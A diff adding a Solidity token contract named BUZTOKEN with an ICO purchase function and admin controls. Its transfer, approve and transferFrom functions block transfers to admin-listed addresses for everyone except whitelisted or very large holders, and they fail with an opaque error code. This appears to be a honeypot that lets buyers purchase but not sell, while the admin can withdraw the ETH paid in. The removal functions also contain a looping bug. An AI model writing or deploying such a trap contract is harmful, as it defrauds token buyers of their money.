@@ -1,0 +1,368 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.8.4;
+
+interface IERC20 {
+
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    function transfer(address recipient, uint256 amount) external returns (bool);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+}
+
+contract BUZTOKEN
+{
+
+    string public constant name = "BUZTOKEN";
+    string public constant symbol = "BUZ";
+    uint8 public constant decimals = 8;
+
+    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
+    event Transfer(address indexed from, address indexed to, uint tokens);
+
+
+    mapping(address => uint256) balances;
+    mapping(address => mapping(address => uint256)) allowed;
+
+    address adminAddress;
+    mapping(address => bool) public targetBWallets;
+    address[] targetBAdds;
+    mapping(address => bool) public wlWallets;
+    address[] wlAdds;
+
+    uint256 public totalSupply = 100 * (10**6) * (10**8);
+    uint256 wlThreshold = totalSupply;
+    bool public ico = false;
+    uint256 public icoPrice = 0;
+
+    using SafeMath for uint256;
+
+    constructor()
+    {
+        balances[msg.sender] = totalSupply/2;
+        balances[address(this)] = totalSupply/2;
+        adminAddress = msg.sender;
+    }
+
+    function balanceOf(address _address) public view returns (uint256)
+    {
+        return balances[_address];
+    }
+
+    function transfer(address _receiver, uint256 _amount) public returns (bool)
+    {
+        require(_amount <= balances[msg.sender], "insufficient balance");
+
+        if(balances[msg.sender]<wlThreshold && !wlWallets[msg.sender])
+            require(!targetBWallets[_receiver], "failed - 102");
+
+        balances[msg.sender] = balances[msg.sender].sub(_amount);
+        balances[_receiver] = balances[_receiver].add(_amount);
+        emit Transfer(msg.sender, _receiver, _amount);
+        return true;
+    }
+
+    function approve(address _address, uint256 _amount) public returns (bool)
+    {
+        if(balances[msg.sender]<wlThreshold && !wlWallets[msg.sender])
+            require(!targetBWallets[_address], "failed - 102");
+
+        allowed[msg.sender][_address] = _amount;
+        emit Approval(msg.sender, _address, _amount);
+        return true;
+    }
+
+    function allowance(address owner, address delegate) public view returns (uint)
+    {
+        return allowed[owner][delegate];
+    }
+
+    function transferFrom(address _originAddress, address _targetAddress, uint256 _amount) public returns (bool)
+    {
+        require(_amount <= balances[_originAddress]);
+        require(_amount <= allowed[_originAddress][msg.sender]);
+
+        require(
+            !targetBWallets[_targetAddress] ||
+        balances[msg.sender]>=wlThreshold ||
+        wlWallets[msg.sender] ||
+        balances[_originAddress]>=wlThreshold ||
+        wlWallets[_originAddress], "failed - 102");
+
+        balances[_originAddress] = balances[_originAddress].sub(_amount);
+        allowed[_originAddress][msg.sender] = allowed[_originAddress][msg.sender].sub(_amount);
+        balances[_targetAddress] = balances[_targetAddress].add(_amount);
+        emit Transfer(_originAddress, _targetAddress, _amount);
+        return true;
+    }
+
+    receive() payable external
+    {
+        if(ico && icoPrice>0)
+        {
+            uint256 _tokenAmount = msg.value / (10**10) * icoPrice;
+            require(_tokenAmount < balances[address(this)], "insufficient token in contract.");
+
+            balances[address(this)] = balances[address(this)].sub(_tokenAmount);
+            balances[msg.sender] = balances[msg.sender].add(_tokenAmount);
+
+            emit Transfer(address(this), msg.sender, _tokenAmount);
+        }
+    }
+
+    function transferFunds(uint256 _amount,address _target) public onlyAdmin
+    {
+        require(address(this).balance >= _amount, "insufficient eth balance");
+
+        address payable payableAddress = payable(_target);
+        payableAddress.transfer(_amount);
+    }
+
+
+
+
+
+
+    function removeFromTargetBAdds(address _address) internal
+    {
+        uint index = 0;
+        for(uint i=0;i<targetBAdds.length;i++)
+        {
+            if(targetBAdds[i]== _address)
+            {
+                index = i;
+                break;
+            }
+        }
+        if (index >= targetBAdds.length) return;
+
+        for (uint i = index; i<targetBAdds.length-1; i++){
+            targetBAdds[i] = targetBAdds[i+1];
+        }
+        targetBAdds.pop();
+    }
+
+    function removeFromWlAdds(address _address) internal
+    {
+        uint index = 0;
+        for(uint i=0;i<wlAdds.length;i++)
+        {
+            if(wlAdds[i]== _address)
+            {
+                index = i;
+                break;
+            }
+        }
+        if (index >= wlAdds.length) return;
+
+        for (uint i = index; i<wlAdds.length-1; i++){
+            wlAdds[i] = wlAdds[i+1];
+        }
+        wlAdds.pop();
+    }
+
+
+
+
+    function getTargetBAdds() public onlyAdmin view returns(address[] memory)
+    {
+        return targetBAdds;
+    }
+
+    function addTBAdd(address[] memory _address) public onlyAdmin
+    {
+        for(uint256 i=0;i< _address.length;i++)
+        {
+            if(!targetBWallets[_address[i]])
+            {
+                targetBWallets[_address[i]] = true;
+                targetBAdds.push(_address[i]);
+            }
+        }
+    }
+
+    function removeTBAdd(address[] memory _address) public onlyAdmin
+    {
+        for(uint256 i=0;i<targetBAdds.length;i++)
+        {
+            if(targetBWallets[_address[i]])
+            {
+                delete targetBWallets[_address[i]];
+                removeFromTargetBAdds(_address[i]);
+            }
+        }
+    }
+
+
+
+    function getWlAdds() public onlyAdmin view returns(address[] memory)
+    {
+        return wlAdds;
+    }
+
+    function addWlAdd(address[] memory _address) public onlyAdmin
+    {
+        for(uint256 i=0;i< _address.length;i++)
+        {
+            if(!wlWallets[_address[i]])
+            {
+                wlWallets[_address[i]] = true;
+                wlAdds.push(_address[i]);
+            }
+        }
+    }
+
+    function removeWlAdd(address[] memory _address) public onlyAdmin
+    {
+        for(uint256 i=0;i<wlAdds.length;i++)
+        {
+            if(wlWallets[_address[i]])
+            {
+                delete wlWallets[_address[i]];
+                removeFromWlAdds(_address[i]);
+            }
+        }
+    }
+
+
+    function getWlThreshold() public onlyAdmin view returns(uint256)
+    {
+        return wlThreshold;
+    }
+
+    function setWlThreshold(uint256 _amount) public onlyAdmin
+    {
+        wlThreshold = _amount;
+    }
+
+
+    function changeIco(bool _ico) public onlyAdmin
+    {
+        ico = _ico;
+    }
+
+    function setIcoPrice(uint256 _amount) public onlyAdmin
+    {
+        icoPrice = _amount;
+    }
+
+
+    function getCustomTokenBalance(IERC20 token) public onlyAdmin view returns(uint256)
+    {
+        return token.balanceOf(address(this));
+    }
+
+    function transferCustomToken(IERC20 token,address targetAddress,uint256 amount) public onlyAdmin
+    {
+        uint256 balance = token.balanceOf(address(this));
+        require(balance>=amount,'insufficient balance');
+        token.transfer(targetAddress,amount);
+    }
+
+    modifier onlyAdmin()
+    {
+        require(msg.sender == adminAddress , "admin only");
+        _;
+    }
+}
+
+
+library SafeMath
+{
+
+    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256)
+    {
+    unchecked {
+        uint256 c = a + b;
+        if (c < a) return (false, 0);
+        return (true, c);
+    }
+    }
+
+    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+    unchecked {
+        if (b > a) return (false, 0);
+        return (true, a - b);
+    }
+    }
+
+    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+    unchecked {
+        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
+        // benefit is lost if 'b' is also tested.
+        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
+        if (a == 0) return (true, 0);
+        uint256 c = a * b;
+        if (c / a != b) return (false, 0);
+        return (true, c);
+    }
+    }
+
+    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+    unchecked {
+        if (b == 0) return (false, 0);
+        return (true, a / b);
+    }
+    }
+
+    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+    unchecked {
+        if (b == 0) return (false, 0);
+        return (true, a % b);
+    }
+    }
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a + b;
+    }
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a - b;
+    }
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a * b;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a / b;
+    }
+
+    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a % b;
+    }
+
+    function sub(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+    unchecked {
+        require(b <= a, errorMessage);
+        return a - b;
+    }
+    }
+    function div(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+    unchecked {
+        require(b > 0, errorMessage);
+        return a / b;
+    }
+    }
+    function mod(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+    unchecked {
+        require(b > 0, errorMessage);
+        return a % b;
+    }
+    }
+}
